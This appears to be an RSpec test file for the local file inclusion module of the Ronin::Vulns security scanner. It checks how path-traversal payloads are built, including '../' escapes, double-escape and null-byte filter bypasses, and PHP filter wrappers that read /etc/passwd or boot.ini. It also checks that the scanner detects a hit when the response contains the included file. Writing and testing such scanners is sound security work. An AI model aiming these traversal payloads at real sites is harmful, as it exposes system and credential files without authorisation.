require 'spec_helper'
require 'web_vuln_examples'
require 'ronin/vulns/lfi'

require 'webmock/rspec'

describe Ronin::Vulns::LFI do
  describe "UNIX_TEST_FILE" do
    subject { described_class::UNIX_TEST_FILE }
  end

  describe "WINDOWS_TEST_FILE" do
    subject { described_class::WINDOWS_TEST_FILE }
  end

  describe ".vuln_type" do
    subject { described_class }

    it "must return :lfi" do
      expect(subject.vuln_type).to eq(:lfi)
    end
  end

  let(:query_param) { 'bar' }
  let(:url)         { "https://example.com/page?foo=1&bar=2&baz=3" }

  subject { described_class.new(url, query_param: query_param) }

  describe "#initialize" do
    include_examples "Ronin::Vulns::WebVuln#initialize examples"

    it "must default #os to :unix" do
      expect(subject.os).to be(:unix)
    end

    it "must set #separator to '/'" do
      expect(subject.separator).to eq('/')
    end

    it "must default #depth to DEFAULT_DEPTH" do
      expect(subject.depth).to eq(described_class::DEFAULT_DEPTH)
    end

    it "must default #filter_bypass to nil" do
      expect(subject.filter_bypass).to be(nil)
    end

    it "must default #escape_path to '../../../../../../'" do
      expect(subject.escape_path).to eq('../../../../../../')
    end

    it "must default #test_file to #{described_class}::UNIX_TEST_FILE" do
      expect(subject.test_file).to be(described_class::UNIX_TEST_FILE)
    end

    context "when initialized with `depth: N'" do
      let(:depth) { 4 }

      subject { described_class.new(url, depth: depth) }

      it "must set #depth" do
        expect(subject.depth).to eq(depth)
      end

      it "must set #escape_path to '../' multiplied by the depth" do
        expect(subject.escape_path).to eq('../' * depth)
      end
    end

    context "when initialized with `os: :windows`" do
      subject { described_class.new(url, os: :windows) }

      it "must set #os to :windows" do
        expect(subject.os).to be(:windows)
      end

      it "must set #separator to '\\'" do
        expect(subject.separator).to eq('\\')
      end

      it "must default #escape_path to '..\\..\\..\\..\\..\\..\\'" do
        expect(subject.escape_path).to eq('..\\..\\..\\..\\..\\..\\')
      end

      it "must default #test_file to #{described_class}::WINDOWS_TEST_FILE" do
        expect(subject.test_file).to be(described_class::WINDOWS_TEST_FILE)
      end

      context "and when initialized with `depth: N'" do
        let(:depth) { 4 }

        subject { described_class.new(url, os: :windows, depth: depth) }

        it "must set #escape_path to '..\\' multiplied by the depth" do
          expect(subject.escape_path).to eq('..\\' * depth)
        end
      end
    end

    context "when initialized with an unknown os: value" do
      let(:os) { :foo }

      it do
        expect {
          described_class.new(url, os: os)
        }.to raise_error(ArgumentError,"unknown os keyword value (#{os.inspect}) must be either :unix or :windows")
      end
    end

    context "when initialized with `filter_bypass: :null_byte" do
      subject { described_class.new(url, filter_bypass: :null_byte) }

      it "must set #filter_bypass to :null_byte" do
        expect(subject.filter_bypass).to be(:null_byte)
      end
    end

    context "when initialized with `filter_bypass: :double_escape" do
      subject { described_class.new(url, filter_bypass: :double_escape) }

      it "must set #filter_bypass to :double_escape" do
        expect(subject.filter_bypass).to be(:double_escape)
      end

      it "must set #escape_path to '....//....//....//....//....//....//'" do
        expect(subject.escape_path).to eq('....//....//....//....//....//....//')
      end

      context "and when initialized with `depth: N`" do
        let(:depth) { 4 }

        subject do
          described_class.new(url, depth: depth, filter_bypass: :double_escape)
        end

        it "must set #depth" do
          expect(subject.depth).to eq(depth)
        end

        it "must set #escape_path to '....//' multiplied by the depth" do
          expect(subject.escape_path).to eq('....//' * depth)
        end
      end

      context "and when initialized with `os: :windows`" do
        subject do
          described_class.new(url, os: :windows, filter_bypass: :double_escape)
        end

        it "must set #escape_path to '....\\\\....\\\\....\\\\....\\\\....\\\\....\\\\'" do
          expect(subject.escape_path).to eq("....\\\\....\\\\....\\\\....\\\\....\\\\....\\\\")
        end

        context "and when initialized with `depth: N`" do
          let(:depth) { 4 }

          subject do
            described_class.new(url, os:            :windows,
                                     depth:         depth,
                                     filter_bypass: :double_escape)
          end

          it "must set #depth" do
            expect(subject.depth).to eq(depth)
          end

          it "must set #escape_path to '....\\\\' multiplied by the depth" do
            expect(subject.escape_path).to eq("....\\\\" * depth)
          end
        end
      end
    end

    context "when initialized with `filter_bypass: :base64`" do
      subject { described_class.new(url, filter_bypass: :base64) }

      it "must set #filter_bypass to :base64" do
        expect(subject.filter_bypass).to be(:base64)
      end
    end

    context "when initialized with `filter_bypass: :rot13`" do
      subject { described_class.new(url, filter_bypass: :rot13) }

      it "must set #filter_bypass to :rot13" do
        expect(subject.filter_bypass).to be(:rot13)
      end
    end

    context "when initialized with `filter_bypass: :zlib`" do
      subject { described_class.new(url, filter_bypass: :zlib) }

      it "must set #filter_bypass to :zlib" do
        expect(subject.filter_bypass).to be(:zlib)
      end
    end

    context "when initialized with `filter_bypass: nil`" do
      subject { described_class.new(url, filter_bypass: nil) }

      it "must set #filter_bypass to nil" do
        expect(subject.filter_bypass).to be(nil)
      end
    end

    context "when initialized with an unknown filter_bypass: value" do
      let(:filter_bypass) { :foo }

      it do
        expect {
          described_class.new(url, filter_bypass: filter_bypass)
        }.to raise_error(ArgumentError,"unknown filter_bypass keyword value (#{filter_bypass.inspect}) must be :null_byte, :double_escape, :base64, :rot13, :zlib, or nil")
      end
    end
  end

  describe "#escape" do
    context "when #os is :windows" do
      context "when the path starts with C:" do
        subject do
          described_class.new(url, query_param: query_param, os: :windows)
        end

        let(:path) { "C:\\foo\\bar\\baz.txt" }

        it "must remove the 'C:\\' prefix and escape the path" do
          expect(subject.escape(path)).to eq("#{subject.escape_path}#{path[3..]}")
        end
      end

      context "when the path starts with another drive letter" do
        let(:path) { "A:\\foo\\bar\\baz.txt" }

        it "must not escape the path" do
          expect(subject.escape(path)).to eq(path)
        end
      end
    end

    context "when the path is an absolute path" do
      let(:path) { '/etc/passwd' }

      it "must escape the path using #escape_path" do
        expect(subject.escape(path)).to eq("#{subject.escape_path}#{path[1..]}")
      end
    end

    context "when the path is a relative path" do
      let(:path) { 'path/to/file' }

      it "must not escape the relative path" do
        expect(subject.escape(path)).to eq(path)
      end
    end
  end

  describe "#encode_payload" do
    let(:path) { '/etc/passwd' }

    context "when #filter_bypass is nil" do
      it "must escape the path" do
        expect(subject.encode_payload(path)).to eq(subject.escape(path))
      end
    end

    context "when #filter_bypass is :null_byte" do
      subject do
        described_class.new(url, query_param:   query_param,
                                 filter_bypass: :null_byte)
      end

      it "must escape the path and append a '\\0' byte" do
        expect(subject.encode_payload(path)).to eq("#{subject.escape(path)}\0")
      end
    end

    context "when #filter_bypass is :base64" do
      subject do
        described_class.new(url, query_param:   query_param,
                                 filter_bypass: :base64)
      end

      it "must return 'php://filter/convert.base64-encode/resource=path'" do
        expect(subject.encode_payload(path)).to eq("php://filter/convert.base64-encode/resource=#{path}")
      end
    end

    context "when #filter_bypass is :rot13" do
      subject do
        described_class.new(url, query_param:   query_param,
                                 filter_bypass: :rot13)
      end

      it "must return 'php://filter/read=string.rot13/resource=path'" do
        expect(subject.encode_payload(path)).to eq("php://filter/read=string.rot13/resource=#{path}")
      end
    end

    context "when #filter_bypass is :zlib" do
      subject do
        described_class.new(url, query_param:   query_param,
                                 filter_bypass: :zlib)
      end

      it "must return 'php://filter/zlib.deflate/convert.base64-encode/resource=path'" do
        expect(subject.encode_payload(path)).to eq("php://filter/zlib.deflate/convert.base64-encode/resource=#{path}")
      end
    end
  end

  describe "#exploit" do
    let(:payload)         { '/etc/passwd' }
    let(:escaped_payload) { subject.escape(payload) }

    include_examples "Ronin::Vulns::WebVuln#exploit examples"
  end

  describe "#vulnerable?" do
    let(:request_url) { subject.exploit_url(subject.test_script_url) }

    let(:response_body) do
      <<~HTML
        <html>
          <body>
            <p>example content</p>
            <p>included content</p>
            <p>more content</p>
          </body>
        </html>
      HTML
    end
    let(:response) { double('Net::HTTPResponse', body: response_body) }

    before do
      expect(subject).to receive(:exploit).with(subject.test_file.path).and_return(response)
    end

    it "must call #exploit with #test_file.path" do
      subject.vulnerable?
    end

    let(:etc_passwd) do
      <<~FILE
        root:x:0:0:root:/root:/bin/ash
        bin:x:1:1:bin:/bin:/sbin/nologin
        daemon:x:2:2:daemon:/sbin:/sbin/nologin
        adm:x:3:4:adm:/var/adm:/sbin/nologin
        lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
        sync:x:5:0:sync:/sbin:/bin/sync
        shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
        halt:x:7:0:halt:/sbin:/sbin/halt
        mail:x:8:12:mail:/var/mail:/sbin/nologin
        news:x:9:13:news:/usr/lib/news:/sbin/nologin
        uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
        operator:x:11:0:operator:/root:/sbin/nologin
        man:x:13:15:man:/usr/man:/sbin/nologin
        postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
        cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
        ftp:x:21:21::/var/lib/ftp:/sbin/nologin
        sshd:x:22:22:sshd:/dev/null:/sbin/nologin
        at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
        squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
        xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
        games:x:35:35:games:/usr/games:/sbin/nologin
        cyrus:x:85:12::/usr/cyrus:/sbin/nologin
        vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
        ntp:x:123:123:NTP:/var/empty:/sbin/nologin
        smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
        guest:x:405:100:guest:/dev/null:/sbin/nologin
        nobody:x:65534:65534:nobody:/:/sbin/nologin
        nginx:x:100:101:nginx:/var/lib/nginx:/sbin/nologin
        vnstat:x:101:102:vnstat:/var/lib/vnstat:/bin/false
        redis:x:102:103:redis:/var/lib/redis:/bin/false
      FILE
    end

    let(:boot_ini) do
      <<~FILE
        [boot loader]
        timeout=30
        default=multi(0)disk(0)rdisk(0)partition(1)\\WINDOWS
        [operating systems]
        multi(0)disk(0)rdisk(0)partition(1)\\WINDOWS="Microsoft Windows XP Professional" /fastdetect
        C:\\CMDCONS\\BOOTSECT.DAT="Microsoft Windows Recovery Console" /cmdcons
      FILE
    end

    context "when #filter_bypass is nil" do
      context "and when the response contains the included /etc/passwd file" do
        let(:response_body) do
          <<~HTML
            <html>
              <body>
                <p>example content</p>
                #{etc_passwd}
                <p>more content</p>
              </body>
            </html>
          HTML
        end

        it "must return true" do
          expect(subject.vulnerable?).to be_truthy
        end
      end

      context "and when the response does not contain the included /etc/passwd file" do
        it "must return false" do
          expect(subject.vulnerable?).to be_falsy
        end
      end

      context "and when #os is :windows" do
        subject do
          described_class.new(url, query_param: query_param, os: :windows)
        end

        context "and when the response contains the included boot.ini file" do
          let(:response_body) do
            <<~HTML
            <html>
              <body>
                <p>example content</p>
                #{boot_ini}
                <p>more content</p>
              </body>
            </html>
            HTML
          end

          it "must return true" do
            expect(subject.vulnerable?).to be_truthy
          end
        end

        context "and when the response does not contain the included boot.ini file" do
          it "must return false" do
            expect(subject.vulnerable?).to be_falsy
          end
        end
      end
    end

    context "when #filter_bypass is :base64" do
      subject do
        described_class.new(url, query_param:   query_param,
                                 filter_bypass: :base64)
      end

      context "and when the response contains the included Base64 encoed /etc/passwd file" do
        let(:response_body) do
          <<~HTML
            <html>
              <body>
                <p>example content</p>
                #{Base64.strict_encode64(etc_passwd)}
                <p>more content</p>
              </body>
            </html>
          HTML
        end

        it "must return true" do
          expect(subject.vulnerable?).to be_truthy
        end
      end

      context "and when the response does not contain the included Base64 encoded /etc/passwd file" do
        it "must return false" do
          expect(subject.vulnerable?).to be_falsy
        end
      end

      context "and when #os is :windows" do
        subject do
          described_class.new(url, query_param:   query_param,
                                   os:            :windows,
                                   filter_bypass: :base64)
        end

        context "and when the response contains the included Base64 encoded boot.ini file" do
          let(:response_body) do
            <<~HTML
            <html>
              <body>
                <p>example content</p>
                #{Base64.strict_encode64(boot_ini)}
                <p>more content</p>
              </body>
            </html>
            HTML
          end

          it "must return true" do
            expect(subject.vulnerable?).to be_truthy
          end
        end

        context "and when the response does not contain the included Base64 encoded boot.ini file" do
          it "must return false" do
            expect(subject.vulnerable?).to be_falsy
          end
        end
      end
    end

    context "when #filter_bypass is :rot13" do
      subject do
        described_class.new(url, query_param:   query_param,
                                 filter_bypass: :rot13)
      end

      context "and when the response contains the included ROT13 encoed /etc/passwd file" do
        let(:response_body) do
          <<~HTML
            <html>
              <body>
                <p>example content</p>
                #{Ronin::Support::Crypto.rot(etc_passwd,13)}
                <p>more content</p>
              </body>
            </html>
          HTML
        end

        it "must return true" do
          expect(subject.vulnerable?).to be_truthy
        end
      end

      context "and when the response does not contain the included ROT13 encoded /etc/passwd file" do
        it "must return false" do
          expect(subject.vulnerable?).to be_falsy
        end
      end

      context "and when #os is :windows" do
        subject do
          described_class.new(url, query_param:   query_param,
                                   os:            :windows,
                                   filter_bypass: :rot13)
        end

        context "and when the response contains the included ROT13 encoded boot.ini file" do
          let(:response_body) do
            <<~HTML
            <html>
              <body>
                <p>example content</p>
                #{Ronin::Support::Crypto.rot(boot_ini,13)}
                <p>more content</p>
              </body>
            </html>
            HTML
          end

          it "must return true" do
            expect(subject.vulnerable?).to be_truthy
          end
        end

        context "and when the response does not contain the included ROT13 boot.ini file" do
          it "must return false" do
            expect(subject.vulnerable?).to be_falsy
          end
        end
      end
    end

    context "when #filter_bypass is :zlib" do
      subject do
        described_class.new(url, query_param:   query_param,
                                 filter_bypass: :zlib)
      end

      context "and when the response contains the included Base64+Zlib compressed encoed /etc/passwd file" do
        let(:response_body) do
          <<~HTML
            <html>
              <body>
                <p>example content</p>
                #{Base64.strict_encode64(Zlib.deflate(etc_passwd))}
                <p>more content</p>
              </body>
            </html>
          HTML
        end

        it "must return true" do
          expect(subject.vulnerable?).to be_truthy
        end
      end

      context "and when the response does not contain the included Base64 + Zlib compressed /etc/passwd file" do
        it "must return false" do
          expect(subject.vulnerable?).to be_falsy
        end

        context "but when the response contains other Base64 strings" do
          let(:response_body) do
            <<~HTML
            <html>
              <body>
                <p>example content</p>
                #{Base64.strict_encode64("hello")}
                <p>more content</p>
              </body>
            </html>
            HTML
          end

          it "must return false" do
            expect(subject.vulnerable?).to be_falsy
          end
        end
     end

      context "and when #os is :windows" do
        subject do
          described_class.new(url, query_param:   query_param,
                                   os:            :windows,
                                   filter_bypass: :zlib)
        end

        context "and when the response contains the included Base64 + Zlib compressed encoded boot.ini file" do
          let(:response_body) do
            <<~HTML
            <html>
              <body>
                <p>example content</p>
                #{Base64.strict_encode64(Zlib.deflate(boot_ini))}
                <p>more content</p>
              </body>
            </html>
            HTML
          end

          it "must return true" do
            expect(subject.vulnerable?).to be_truthy
          end
        end

        context "and when the response does not contain the included Base64 + Zlib compressed boot.ini file" do
          it "must return false" do
            expect(subject.vulnerable?).to be_falsy
          end
        end
      end
    end
  end
end
